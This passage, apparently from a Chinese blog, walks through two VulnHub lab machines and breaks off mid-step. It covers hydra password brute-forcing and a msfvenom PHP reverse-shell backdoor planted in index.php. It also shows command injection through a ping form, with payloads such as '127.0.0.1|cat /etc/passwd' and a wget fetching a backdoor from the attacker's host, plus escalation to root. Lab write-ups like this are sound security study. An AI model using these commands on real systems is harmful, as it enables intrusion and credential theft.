class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-3"><a class="markdownIt-Anchor" href="#web路径枚举-3"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径<br />未发现有效信息<br />在主页处有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find the Bug</span><br><span class="line">You need extra WebSec </span><br></pre></td></tr></table></figure><p>发现存在Web路径<code>/websec</code><br />再针对该路径进一步扫描</p><p><code>dirb http://192.168.31.39/websec/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;0 (CODE:200|SIZE:4346)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;01 (CODE:200|SIZE:4644)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1 (CODE:200|SIZE:4644)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1x1 (CODE:200|SIZE:4644)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;about (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;About (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;admin (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;api (CODE:200|SIZE:0)                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;assets (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;author (CODE:200|SIZE:4208)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;blog (CODE:200|SIZE:4346)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;category (CODE:200|SIZE:4366)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;cm (CODE:500|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;feed (CODE:200|SIZE:765)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;fm (CODE:200|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;lib (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;log (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;login (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;robots.txt (CODE:200|SIZE:65)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;sites (CODE:301|SIZE:331)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;src (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tag (CODE:200|SIZE:4361)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tags (CODE:200|SIZE:3554)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;test (CODE:301|SIZE:329)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;themes (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tmp (CODE:301|SIZE:327)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><p>WEB服务存在登录页面<br />主页中已经给出了一个联系邮箱:<code>contact@hacknos.com</code><br />可以利用hydra进行口令枚举</p><p>使用top6000弱口令进行枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P FuzzDicts-master&#x2F;passwordDict&#x2F;top6000.txt -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br></pre></td></tr></table></figure><p>未获得账户口令</p><p>使用cewl获取页面内容来作为口令<br /><code>cewl http://192.168.31.39/websec -w pass</code></p><p>使用网站内容作来枚举账户口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P pass -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.31.39   login: contact@hacknos.com   password: Securityx</span><br></pre></td></tr></table></figure><p>得到Web账户权限</p><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><p>Web页面中可以在左侧菜单中选择<code>Content &gt; File Manager</code>来管理文件<br />尝试写入Webshell，但是无法访问到文件</p><p>尝试使用msfvenom创建基于php的meterpreter后门，再写入到index.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">cat shell.php</span><br></pre></td></tr></table></figure><p>将内容复制到index.php文件末</p><p>在MSF中接收Meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在Meterpreter的shell中切换至交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br><span class="line">   uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>查看/etc/passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">blackdevil:x:1000:118:hackNos:&#x2F;home&#x2F;blackdevil:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>发现文件<code>/var/local/database</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;local&#x2F;database</span><br><span class="line"></span><br><span class="line">Expenses</span><br><span class="line">Software Licenses,$2.78</span><br><span class="line">Maintenance,$68.87</span><br><span class="line">Mortgage Interest,$70.35</span><br><span class="line">Advertising,$9.78</span><br><span class="line">Phone,$406.80</span><br><span class="line">Insurance,$9.04</span><br><span class="line">Opss;fackespreadsheet</span><br></pre></td></tr></table></figure><p>得到提示fackespreadsheet<br />在某个不存在的网站上搜索得到在线解密工具<br /><code>http://www.spammimic.com/spreadsheet.php?action=decode</code><br />解密得<code>Security@x@</code></p><p>尝试以此作为口令登入blackdevil账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh blackdevil@192.168.31.39</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;1000(blackdevil) gid&#x3D;118(docker) groups&#x3D;118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)</span><br></pre></td></tr></table></figure><p>尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>hydra在用于爆破Web登录时需要调整的参数有点多</p><ul><li>http请求类型</li><li>数据的参数名</li><li>登录成功/失败时所回应的信息<br />由于登陆失败会回应<code>Wrong email or password</code><br />所以借以该信息来判断是否登入成功</li></ul><p>获取Webshell时有些麻烦，一开始以为是传统的php一句话上传，结果发现上传的文件都不能打开，屡次尝试后转而使用Meterpreter获取Shell</p><p>解密过程的脑洞较大(感觉像是玩CTF的古典密码…)，善用搜索引擎总归是件好事</p><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/weixin_39219503/article/details/103865033">WP</a><br /><a href="https://blog.csdn.net/weixin_43039349/article/details/89323846">hydra</a></p></blockquote><hr /><h1 id="reconforce"><a class="markdownIt-Anchor" href="#reconforce"></a> <a href="https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/">ReconForce</a></h1><p><code>2020/02/02 20:17:42</code></p><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.109</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.109</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.31.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)</span><br><span class="line">|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)</span><br><span class="line">|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Recon_Web</span><br><span class="line">MAC Address: 08:00:27:83:C2:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-4"><a class="markdownIt-Anchor" href="#web路径枚举-4"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径<br />未发现有效信息<br />在主页处存在一个链接导向<code>/5ecure/</code>路径<br />存在Basic认证，而且附带一个提示信息<code>Recon Security</code></p><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><p>FTP服务允许匿名登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.109</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><p>匿名登入之后发现不能进行进一步的操作</p><p>发现Banner为<code>Secure@hackNos</code></p><p>使用cewl生成字典<br /><code>cewl http://192.168.31.109/ &gt;&gt; data</code></p><p>添加一些常用词以及获取到的一些信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root&quot; &gt;&gt; data</span><br><span class="line">echo &quot;admin&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Recon Security&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Secure@hackNos&quot; &gt;&gt; data</span><br><span class="line">echo &quot;5ecure&quot; &gt;&gt; data</span><br><span class="line">echo &quot;&quot; &gt;&gt; data</span><br></pre></td></tr></table></figure><blockquote><p>Basic认证是基于Get请求进行的，需要附加的一个Head–<code>Authorization</code>，而其内容为<code>Basic xxxxxxxx</code>，其中<code>xxxxxxxx</code>为<code>user:pass</code>进行base64编码之后的结果</p></blockquote><p>使用python脚本转变为相应的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#test.py</span><br><span class="line">import base64</span><br><span class="line">raw &#x3D; [ </span><br><span class="line">        &#39;Recon&#39;,</span><br><span class="line">        &#39;Web&#39;,</span><br><span class="line">        &#39;Home&#39;,</span><br><span class="line">        &#39;Service&#39;,</span><br><span class="line">        &#39;Blog&#39;,</span><br><span class="line">        &#39;hackNos&#39;,</span><br><span class="line">        &#39;TroubleShoot&#39;,</span><br><span class="line">        &#39;Security&#39;,</span><br><span class="line">        &#39;Recon Security&#39;,</span><br><span class="line">        &#39;Secure&#39;,</span><br><span class="line">        &#39;root&#39;,</span><br><span class="line">        &#39;5ecure&#39;,</span><br><span class="line">        &#39;admin&#39;,</span><br><span class="line">        &#39;Secure@hackNos&#39;,</span><br><span class="line">        &#39;Security@hackNos&#39;,</span><br><span class="line">        &#39;&#39;]</span><br><span class="line">for i in raw:</span><br><span class="line">        for j in raw:</span><br><span class="line">            print base64.b64encode(j + &#39;:&#39; + i)</span><br></pre></td></tr></table></figure><p><code>./test.py &gt; b64.dir</code></p><p>然后在Burp中使用生成的字典进行破解</p><blockquote><p>在爆破的时候遇到了问题，没有爆破出来账户，无奈之下只好在网上看看其他大神的思路，发现貌似作者是想在FTP Banner里写上Security@hackNos但实际写成了Secure@hackNos<br />修改一下脚本里面的raw数组之后发现爆破成功了<br />账户为<code>admin:Security@hackNos</code></p></blockquote><p>进入<code>/5ecure/</code>路径之后发现是一个ping工具，结合一下CTF的内容不难想到这个就是命令注入了，命令执行是在out.php下执行的，而且ping的结果会有回显</p><p><code>&amp; &amp;&amp; | || ;</code> 用这几个符号挨个尝试命令注入</p><p>发现<code>127.0.0.1|ls</code>可以列出当前目录下的文件</p><p><code>127.0.0.1|cat /etc/passwd</code> 也能读取passwd文件</p><p>尝试写入phpinfo<br /><code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.php</code></p><p>但是访问1.php时phpinfo未显示，可能存在过滤<br /><code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.txt</code></p><p>1.txt中显示的是<code>&lt;?php phpinfo;?&gt;</code></p><p>看样子是过滤掉了小括号</p><p>查看out.php</p><p><code>127.0.0.1|cat out.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;</span><br><span class="line">&#123;$cmd&#125;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>可以看到过滤掉了一些特殊符号，尝试使用wget命令来下载后门</p><p>使用msfvenom创建基于php的meterpreter后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>去掉shell.php中开头的<code>/*</code></p><p>开启python的http服务</p><p><code>python -m SimpleHTTPServer 8000</code></p><p>在网页中执行wget</p><p><code>127.0.0.1|wget http://192.168.31.10:8000/shell.php</code></p><p>在MSF中接收Meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>再访问shell.php即可</p><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><p>在Meterpreter的shell中获取TTY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在passwd文件中发现可用账户recon<br 